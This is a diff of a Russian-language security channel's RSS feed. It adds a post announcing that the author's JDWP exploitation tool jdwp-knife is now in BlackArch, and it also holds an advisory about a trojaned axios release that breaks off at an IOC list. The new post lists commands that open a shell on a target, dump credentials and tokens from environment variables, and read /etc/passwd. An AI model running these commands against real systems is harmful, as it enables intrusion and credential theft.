@@ -1,5 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>s0ld13r ch.</title><link>https://t.me/s0ld13r_ch</link><description>Blog about Pentest, TI/TH, OPSEC &amp; other security stuff</description><language>ru</language><lastBuildDate>Tue, 31 Mar 2026 09:55:30 +0000</lastBuildDate><item><title>Massive axios supply chain campaign 👩‍💻</title><link>https://t.me/s0ld13r_ch/368</link><description>Massive axios supply chain campaign 👩‍💻
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>s0ld13r ch.</title><link>https://t.me/s0ld13r_ch</link><description>Blog about Pentest, TI/TH, OPSEC &amp; other security stuff</description><language>ru</language><lastBuildDate>Thu, 02 Apr 2026 11:21:01 +0000</lastBuildDate><item><title>jdwp-knife now is in BlackArch repository 👩‍💻</title><link>https://t.me/s0ld13r_ch/370</link><description>jdwp-knife now is in BlackArch repository 👩‍💻
+Мой инструмент для эксплуатации протокола JDWP теперь официально доступен в репозиториях дистрибутива BlackArch Linux 👩‍💻
+Installation:
+sudo pacman -S jdwp-knife
+Usage:
+# Pseudo-interactive shell (cd, ls, cat, whoami — like SSH)
+jdwp-knife -t TARGET -p 5005 --shell
+# Dump environment variables (credentials, tokens, connection strings)
+jdwp-knife -t TARGET -p 5005 --env
+# Read file
+jdwp-knife -t TARGET -p 5005 --cat /etc/passwd
+💻 PR:  https://github.com/BlackArch/blackarch/pull/4899
+🧢 s0ld13r
+
+[Media: Фото]</description><pubDate>Thu, 02 Apr 2026 11:21:01 +0000</pubDate><guid isPermaLink="false">telegram_s0ld13r_ch_370</guid></item><item><title>Massive axios supply chain campaign 👩‍💻</title><link>https://t.me/s0ld13r_ch/368</link><description>Massive axios supply chain campaign 👩‍💻
 В популярной библиотеке axios (версии 1.14.1 и 0.30.4) был обнаружен опасный троян (RAT), внедренный через взломанный аккаунт одного из мейнтейнеров проекта. Вредонос маскируется под зависимость plain-crypto-js, которая при установке незаметно заражает Windows, macOS и Linux, после чего удаляет свои следы 🚨
 Если вы обновляли пакеты 30–31 марта, проверьте наличие вредоносных файлов (полный список ниже) на хостах. Для очистки проекта откатитесь на версии 1.14.0 или 0.30.3 и обязательно сбросьте все секреты (API-ключи, токены), так как они могли быть похищены 😃
 🛡  IOC for hunts:
